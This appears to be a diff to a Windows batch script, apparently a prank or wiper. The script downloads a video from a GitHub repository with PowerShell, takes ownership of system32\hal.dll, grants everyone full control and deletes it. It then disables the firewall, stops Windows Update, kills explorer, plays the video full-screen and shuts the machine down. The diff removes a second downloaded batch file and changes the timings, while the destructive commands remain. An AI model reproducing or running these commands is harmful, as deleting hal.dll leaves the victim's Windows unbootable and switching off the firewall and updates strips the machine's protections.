@@ -30,8 +30,6 @@ md asylum
 
 powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.mp4','C:\your\asylum\Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.mp4')"
 
-powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/bobe.bat','C:\your\asylum\bobe.bat')"
-
 takeown /f "%systemdrive%\windows\system32\hal.dll"
 icacls "%systemdrive%\windows\system32\hal.dll" /grant everyone:f
 DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll"
@@ -50,8 +48,8 @@ netsh firewall set opmode mode-disable
 net stop "wuauserv"
 taskkill /f /im explorer.exe
 
-start bobe.bat
+start max Video_25a2cc85-b86a-4028-9aac-01ba5849c1e8.mp4
 
-timeout /t 6
-shutdown -s -t 17
+timeout /t 15
+shutdown -s -t 15
 exit
